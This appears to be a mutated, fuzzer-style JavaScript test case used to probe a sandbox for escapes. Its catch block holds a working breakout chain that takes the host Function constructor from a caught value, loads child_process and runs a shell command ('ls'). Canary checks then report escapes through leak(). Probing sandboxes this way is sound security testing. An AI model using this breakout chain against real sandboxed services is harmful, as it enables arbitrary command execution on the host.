try {
    var __obj = {
        valueOf: function () {
            let REPLACER = 23;
        },
        toString: void 0
    };
    var __matched = new String(__obj).match(function () {
        throw () => {
            return () => {
            };
        };
    }());
    var __expected = RegExp(undefined).exec('undefined');
    if (__matched.length !== __expected.length) {
        $ERROR('#1: __obj = {valueOf:function(){}, toString:void 0}; __matched = new String(__obj).match(function(){}()); __expected = RegExp(undefined).exec("undefined"); __matched.length === __expected.length. Actual: ' + __matched.length);
    }
    if (__matched.index !== __expected.index) {
        $ERROR('#2: __obj = {valueOf:function(){}, toString:void 0}; __matched = new String(__obj).match(function(){}()); __expected = RegExp(undefined).exec("undefined"); __matched.index === __expected.index. Actual: ' + __matched.index);
    }
    if (__matched.input !== __expected.input) {
        $ERROR('#3: __obj = {valueOf:function(){}, toString:void 0}; __matched = new String(__obj).match(function(){}()); __expected = RegExp(undefined).exec("undefined"); __matched.input === __expected.input. Actual: ' + __matched.input);
    }
    for (var index = 0; index < __expected.length; index++) {
        if (__matched[index] !== __expected[index]) {
            $ERROR('#4.' + index + ': __obj = {valueOf:function(){}, toString:void 0}; __matched = new String(__obj).match(function(){}()); __expected = RegExp(undefined).exec("undefined"); __matched[' + index + ']===__expected[' + index + ']. Actual: ' + __matched[index]);
        }
    }
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}